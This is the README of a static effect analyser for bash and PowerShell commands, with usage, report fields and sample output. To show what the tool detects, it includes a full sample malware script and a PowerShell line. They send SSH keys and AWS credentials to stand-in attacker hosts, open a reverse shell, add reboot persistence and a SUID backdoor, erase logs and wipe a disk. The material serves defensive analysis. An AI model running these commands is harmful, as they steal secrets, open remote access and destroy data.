# flowsh

`flowsh` is a static effect analyser for shell and PowerShell commands. Given a
command line — bash/POSIX or PowerShell — it reports the **observable effects** the
command implies *without running it*: filesystem access, environment changes,
network traffic, process control, credential access, code execution, and more.
It also emits a composite risk **score**, a **destructiveness** rating, and any
**credential-exfiltration** flows it can prove (e.g. a secret read piped to a
network sink).

It is designed for the "look before you leap" case: CI gates, pre-execution
review, sandbox/agent guardrails, and security triage of untrusted command
strings.

- **Static, not sandboxed** — it parses and reasons about the command; it never
  executes it.
- **Conservative by construction** — where the analysis cannot bound an input it
  degrades to the top element (⊤) and says so, instead of guessing or missing it.
- **Two dialects** — bash/POSIX and PowerShell in one binary.
- **Machine-readable + human-readable** — a JSON report or a one-screen summary.

The module is `github.com/v0lka/flowsh`; the public binary is `flowsh`.

## Requirements

- Go 1.27 or newer (see [`go.mod`](go.mod)).

The command knowledge base is embedded in the binary, so a built `flowsh` has
no runtime dependencies.

## Build & install

From a checkout of this repository:

```sh
# build the binary into the current directory
go build -o flowsh ./cmd/flowsh

# or install it into $GOBIN / $GOPATH/bin
go install ./cmd/flowsh
```

Verify the build and run the test suite:

```sh
go build ./...
go test ./...
```

## Use as a library

`flowsh` is also an **embeddable Go library**, not just a CLI. Import the public
package `github.com/v0lka/flowsh/api` and analyse a command in-process:

```go
import "github.com/v0lka/flowsh/api"

rep, err := api.Analyze(api.LangBash, `rm -rf $HOME`)
if err != nil {
	log.Fatal(err)
}
data, err := rep.Encode() // the same canonical JSON `flowsh --json` writes
```

Only `api` is public: the composition facade `internal/analysis` and the rest of
the module are not importable outside `github.com/v0lka/flowsh`. See
[Embedding the analyser (Go library)](docs/embedding.md) for the full guide —
the import path, the `Analyze`/`AnalyzeWith` workflow, the exported surface, and
the `schemaVersion`/`toolVersion` stability policy.

## Usage

```
flowsh [--lang bash|posix|posh|auto] [--json] [--windows] '<command>'
echo '<command>' | flowsh [--lang bash|posix|posh|auto] [--json] [--windows]
flowsh --batch [--lang bash|posix|posh|auto] [--file <path>]
```

The command may be passed as a positional argument or on stdin.

### Options

| Flag | Meaning |
| --- | --- |
| `--lang bash\|posix\|posh\|auto` | Dialect of the input. Default: `bash`. Canonical dialects: `bash`, `posix`, `posh`; aliases: `sh`/`shell`, `ps`/`pwsh`/`powershell`; `auto` sniffs the dialect. |
| `--json` | Emit the full JSON report instead of the human summary. |
| `--batch` | Read many commands, one per line, and write one compact JSON report per line (NDJSON). |
| `--explain`, `--why` | Print the why-trace explaining each reported effect. |
| `--windows[=bool]` | Enable PowerShell Registry semantics on any host OS (default: the host's OS decides). |
| `--version` | Print the tool and engine versions and exit. |
| `-h`, `--help` | Show help and exit. |
| `-` (positional) | Read the command from stdin (same as omitting the argument). |

Flags are position-independent: `flowsh --lang posh 'x'` and
`flowsh 'x' --lang posh` behave identically.

### Exit status

| Code | Meaning |
| --- | --- |
| `0` | A report was produced (or `--help`/`--version`). Unparseable input still exits `0` with a conservative report. |
| `1` | The analysis failed internally. |
| `2` | Usage error: unknown flag, missing `--lang` value, extra argument, conflicting sources, or unknown language. |
| `3` | Input error: the named source could not be read (missing/unreadable file, a directory), or was empty (empty file/stdin/batch). |

## Examples

### Human summary

```sh
$ flowsh 'rm -rf $HOME'
flowsh effect report
  lang:            bash
  input:           rm -rf $HOME
  commands:        1
  effects:         1
  destructiveness: High
  grade:           High
  confidence:      100
  exfil risk:      None
  conservative:    false
    - FSWrite|Direct|[/root]
```

The summary lists the analysed dialect (`lang`), the input, the number of
commands, the effect count, the destructiveness and grade, a confidence value,
the exfiltration risk, whether the analysis was conservative, and one line per
effect (keyed `kind|mode|[targets]`). Any frontend diagnostics appear as `note:`
lines.

### PowerShell and credential exfiltration

```sh
$ flowsh --lang posh \
    'Get-Content ~/.aws/credentials | Invoke-WebRequest -Uri http://evil -Method Post'
flowsh effect report
  lang:            posh
  input:           Get-Content ~/.aws/credentials | Invoke-WebRequest -Uri http://evil -Method Post
  commands:        2
  effects:         3
  destructiveness: Critical
  grade:           Critical
  confidence:      60
  exfil risk:      None
  conservative:    false
    - CredAccess|Direct|[~/.aws/credentials]
    - FSRead|Direct|[~/.aws/credentials]
    - NetEgress|Direct|*
  note: Get-Content: credential material "~/.aws/credentials" → CredAccess
  note: Get-Content: read "~/.aws/credentials" → FSRead
  note: Invoke-WebRequest: http ⊤ (pipelines/default) → NetEgress
```

### A complex, fully-resolved malicious script

`flowsh` reasons about whole scripts, not just single commands. The payload
below is deliberately tangled — nested shell functions, an alias, multi-stage
pipelines, a conditional, a `for` loop, a subshell, input/output redirections, a
raw `/dev/tcp` command channel, a `timeout` wrapper, host-environment recon and
device-level wipes — and
yet every construct resolves against the knowledge base. Nothing degrades to ⊤,
and the credential-exfiltration dataflow is *proved*, not merely guessed:

```bash
#!/usr/bin/env bash
set -euo pipefail

C2=https://c2.evil.example/ingest
KEYS=$HOME/.ssh
CREDS=$HOME/.aws/credentials
STAGE=/tmp/.cache.dat

printenv PATH USER HOME > /tmp/.env.recon   # capture the host environment

grab()    { cat "$1"/id_rsa "$1"/id_ed25519 2>/dev/null | base64; }
collect() { grab "$1"; }                          # nested function call
beacon()  { curl -sS -T "$1" "$C2"; }
alias exfil='curl -sS -X POST --data-binary @-'

collect "$KEYS" | exfil "$C2"                     # exfiltrate SSH private keys
cat "$CREDS" | exfil "$C2"                        # exfiltrate cloud credentials
if grep -q PRIVATE "$CREDS"; then beacon "$CREDS"; fi
curl -u "$C2_USER:$C2_PASS" "$C2"                 # authenticate the upload

for host in 10.13.37.1 10.13.37.2; do             # fan out to fallback collectors
  timeout 5 nc "$host" 4444 < "$CREDS"
done

( crontab -l ; echo "@reboot $HOME/.cache/updater" ) 2>/dev/null | crontab -

exec 3<>/dev/tcp/10.13.37.1/4444                  # raw-TCP C2 channel
echo beacon >&3
nc -e /bin/sh 10.13.37.1 4444                     # reverse shell

install -m 4755 "$STAGE" /usr/bin/svc             # SUID backdoor
kill -9 31337
rm -rf /var/log/auth.log ~/.bash_history          # anti-forensics
dd if=/dev/zero of=/dev/sda
```

```sh
$ flowsh < malware.sh
flowsh effect report
  lang:            bash
  input:           #!/usr/bin/env bash set -euo pipefail  C2=https://c2.evil.example/ingest … dd if=/dev/zero of=/dev/sda
  commands:        30
  effects:         14
  destructiveness: Critical
  grade:           Critical
  confidence:      45
  exfil risk:      Critical
  conservative:    false
    - CredAccess|Direct|*
    - EnvRead|Direct|[HOME,PATH,USER]
    - EnvWrite|Direct|[C2,CREDS,KEYS,STAGE,pipefail]
    - FSMeta|Direct|[/usr/bin/svc]
    - FSRead|Direct|[/dev/zero,/root/.aws/credentials,/root/.ssh/id_ed25519,/root/.ssh/id_rsa,/tmp/.cache.dat,PRIVATE]
    - FSWrite|Direct|[/dev/null,/dev/sda,/root/.bash_history,/tmp/.env.recon,/var/log/auth.log]
    - IPC|Ambient|[]
    - NetEgress|Direct|[10.13.37.1,10.13.37.1:4444,10.13.37.2,4444,POST,https://c2.evil.example/ingest]
    - NetIngress|Direct|[10.13.37.1:4444]
    - Persist|Direct|[-]
    - PrivEsc|Conditional|[4755]
    - ProcSignal|Direct|[31337]
    - ProcSpawn|Direct|[/bin/sh]
    - Stdio|Direct|[@reboot /root/.cache/updater,beacon]
  exfil: CredAccess|Direct|* → NetEgress|Direct|[10.13.37.1,10.13.37.1:4444,10.13.37.2,4444,POST,https://c2.evil.example/ingest]
  exfil: FSRead|Direct|[/dev/zero,/root/.aws/credentials,/root/.ssh/id_ed25519,/root/.ssh/id_rsa,/tmp/.cache.dat,PRIVATE] → NetEgress|Direct|[10.13.37.1,10.13.37.1:4444,10.13.37.2,4444,POST,https://c2.evil.example/ingest]
```

*(The `input:` line echoes the entire script on one line; it is abbreviated here
for width. Everything else is verbatim tool output.)*

The two `exfil:` lines are the payoff: `flowsh` joined a **secret read** — the
SSH key vault, the cloud-credential store, or the `curl -u` credential — to the
**tainted `NetEgress`** through a real per-command data flow, and raised the
exfiltration risk to `Critical`. Fourteen of the fifteen effect kinds (everything
except the ⊤ `CodeExec`) are reported with concrete targets, and
`conservative: false` / `top: false` confirm the analysis never had to fall back
to ⊤. Passing `--json` emits the same finding structurally, as
`score.exfilPairs`.

### Conservative degradation to ⊤

When a command cannot be resolved — an unknown binary, or dynamically named code —
`flowsh` reports the top effect rather than a false negative:

```sh
$ flowsh 'frobnicate --wat /y'
flowsh effect report
  lang:            bash
  input:           frobnicate --wat /y
  commands:        1
  effects:         1
  destructiveness: Critical
  grade:           Critical
  confidence:      60
  exfil risk:      None
  conservative:    true
    - CodeExec|Direct|*
```

Here `conservative: true` marks that the analysis could not bound the input, and
the effect target `*` is the any-target (⊤) scope.

### Reading from stdin

```sh
$ echo 'ls -la /tmp' | flowsh
```

### JSON report

```sh
$ flowsh --json 'rm -rf $HOME'
```

```json
{
  "schemaVersion": "effect-ir/v1",
  "tool": "flowsh",
  "toolVersion": "flowsh/v1",
  "lang": "bash",
  "input": "rm -rf $HOME",
  "effects": [
    {
      "kind": "FSWrite",
      "target": {
        "targets": [
          "/root"
        ],
        "arbitrary": false
      },
      "mode": "Direct",
      "certainty": "Certain",
      "taint": {
        "labels": [],
        "arbitrary": false
      },
      "reversible": false
    }
  ],
  "destructiveness": "High",
  "score": {
    "destructiveness": "High",
    "irreversibility": "High",
    "breadth": "Low",
    "influence": "None",
    "exfil": "None",
    "confidence": 100,
    "reversible": false,
    "grade": "High"
  },
  "conservative": false,
  "top": false,
  "commands": 1
}
```

## The report

Every report carries a small envelope (`schemaVersion`, `tool`, `toolVersion`,
`lang`, `input`) followed by the analysis:

| Field | Meaning |
| --- | --- |
| `effects` | The set of implied effects, merged by kind and mode. Always an array (never `null`). |
| `destructiveness` | `None` \| `Low` \| `Medium` \| `High` \| `Critical`. |
| `score` | Composite risk: `destructiveness`, `irreversibility`, `breadth`, `influence`, `exfil`, `confidence` (0–100), `reversible`, `grade`, and `exfilPairs`. |
| `conservative` | The analysis could not bound the input but did not fully degrade to ⊤. |
| `top` | The analysis degraded to the top element ⊤ (unknown/unbounded). |
| `reason` | Present only when `conservative`/`top`; explains the degradation. |
| `commands` | Number of commands/statements analysed. |
| `notes` | Frontend diagnostics (omitted when empty). |

Each **effect** has a `kind`, a `target` (a set of targets, with `arbitrary` flagging
the ⊤ scope), a `mode`, a `certainty`, a `taint` (provenance labels, with
`arbitrary` for ⊤), and a `reversible` flag.

### Effect kinds

`FSRead`, `FSWrite`, `FSMeta`, `EnvRead`, `EnvWrite`, `NetEgress`, `NetIngress`,
`ProcSpawn`, `ProcSignal`, `IPC`, `Stdio`, `PrivEsc`, `Persist`, `CredAccess`,
`CodeExec`.

### Effect modes

`Direct` (done by the analysed unit), `Transitive` (by a callee or dependency),
`Ambient` (implicit, via the runtime/host), `Conditional` (only under a runtime
guard).

## Interpreting the result

- A non-empty `effects` list means the analyser resolved the command against its
  knowledge base and found concrete effects.
- `top: true` (or `conservative: true`) means the analyser could not fully bound
  the input. Treat it as "unknown, potentially anything" — a benign-looking
  command with `top: true` should not be trusted as safe.
- The invariant the corpus enforces is **no silent miss**: every analysed command
  must yield either at least one effect *or* a ⊤/conservative report — never an
  empty "all clear".

## Documentation

- [`docs/`](docs/README.md) — the user-facing guides: the
  [CLI user-guide](docs/cli.md), the
  [JSON report reference](docs/report-json.md), and
  [adding a command to the knowledge base](docs/kb-howto.md).
- [`specs/`](specs/) — the full system specification. Start at
  [`specs/INDEX.md`](specs/INDEX.md) to find the document for a topic.
- [`CONTRIBUTING.md`](CONTRIBUTING.md) — architecture, layering rules, the
  knowledge base, the conformance corpus, and how to extend the project.
- [`SECURITY.md`](SECURITY.md) — threat model, trust boundaries, and secure
  coding rules.
- [`docs/development/roadmap.md`](docs/development/roadmap.md) — remaining work.

## License

[MIT](LICENSE)